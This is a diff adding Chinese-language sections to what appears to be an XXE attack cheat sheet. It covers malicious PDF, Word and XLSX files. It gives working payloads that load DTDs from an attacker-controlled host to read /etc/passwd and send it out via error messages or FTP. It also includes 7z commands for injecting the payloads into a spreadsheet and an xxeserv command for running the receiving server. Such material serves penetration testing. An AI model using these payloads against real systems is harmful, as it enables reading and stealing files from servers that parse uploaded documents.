@@ -291,3 +291,100 @@ xxe.xml:
 ```
 
 ### 2.PDF
+
+pdf.dtd:
+```XML
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+Payload:
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "http://攻击者主机地址/pdf.dtd">
+%xxe;
+]>
+<foo>
+  <bar>&xxe;</bar>
+</foo>
+```
+
+### 3.Office Word
+
++ /word/document.xml
++ /ppt/presentation.xml
++ /xl/workbook.xml
+
+document.xml:
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://攻击者主机地址/evil.dtd">
+%ext;
+]>
+<root>&exfil;</root>
+```
+
+工具
+
+[OXML_XXE](https://github.com/BuffaloWill/oxml_xxe)
+
+### 4.XLSX
+
+7z l xxe.xlsx
+
+```bash
+_rels/.rels
+xl/workbook.xml
+ xl/styles.xml
+xl/worksheets/sheet1.xml
+xl/_rels/workbook.xml.rels
+xl/sharedStrings.xml
+docProps/core.xml
+docProps/app.xml
+[Content_Types].xml
+```
+
+提取 EXCEL 文件
+```bash
+7z x -oXXE xxe.xlsx
+```
+
+Payload添加:
+
+xl/workbook.xml:
+```XML
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<cdl>&rrr;</cdl>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+```
+
+或者
+
+xl/sharedStrings.xml:
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
+```
+
+xxe.dtd
+```XML
+<!ENTITY % d SYSTEM "file:///etc/passwd">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
+```
+
+重建EXCEL文件
+```bash
+cd XXE
+7z u ../xxe.xlsx *
+```
+
+使用[xxeserv](https://github.com/staaldraad/xxeserv)放置DTD文件并接收FTP请求
+```bash
+$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
+```
